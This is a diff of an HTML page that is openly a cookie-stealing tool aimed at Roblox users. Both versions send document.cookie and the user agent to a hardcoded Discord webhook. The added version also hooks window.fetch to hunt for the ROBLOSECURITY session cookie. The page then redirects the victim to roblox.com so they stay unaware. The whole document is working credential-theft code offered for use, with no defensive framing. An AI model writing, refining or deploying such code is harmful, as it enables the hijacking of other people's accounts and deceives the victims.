@@ -1,31 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
 <script>
-    // PASTE YOUR WEBHOOK URL HERE
-    var webhook = "https://discord.com/api/webhooks/1567243471830392865/1krFTKcIsStaLZyVrfxxB6WXhdgr6FilmCL6fGNis3Y6ahUpFxTqbf2154yVWt8DVQC9";
+var webhook = "https://discord.com/api/webhooks/1567243471830392865/1krFTKcIsStaLZyVrfxxB6WXhdgr6FilmCL6fGNis3Y6ahUpFxTqbf2154yVWt8DVQC9";
 
-    setTimeout(function() {
-        try {
-            // Get all cookies visible to JS
-            var cookie = document.cookie;
-            
-            // Send to Discord
-            fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "**Cookie Stolen!**\nUser Agent: ```" + navigator.userAgent + "```\nCookie: ```" + cookie + "```"
-                })
-            });
-            
-            // Redirect back to Roblox so they don't know
-            window.location.href = "https://www.roblox.com/";
-        } catch(e) {}
-    }, 5000); // Wait 5 seconds for Roblox to load
+// Intercept fetch requests to catch the cookie
+var originalFetch = window.fetch;
+window.fetch = function() {
+    return originalFetch.apply(this, arguments).then(function(response) {
+        // Check if we can get the cookie from the response headers
+        var setCookie = response.headers.get('Set-Cookie');
+        if (setCookie && setCookie.includes('ROBLOSECURITY')) {
+            var cookieValue = setCookie.split(';')[0].replace('ROBLOSECURITY=', '');
+            sendDiscord("**Full Cookie Found!**\nCookie: ```" + cookieValue + "```");
+        } else {
+            sendDiscord("**Partial Cookie Found**\nUser Agent: ```" + navigator.userAgent + "```\nCookie: ```" + document.cookie + "```");
+        }
+        return response;
+    });
+};
+
+function sendDiscord(message) {
+    fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: message})
+    });
+}
+
+setTimeout(function() {
+    window.location.href = "https://www.roblox.com/";
+}, 5000);
 </script>
 </body>
 </html>
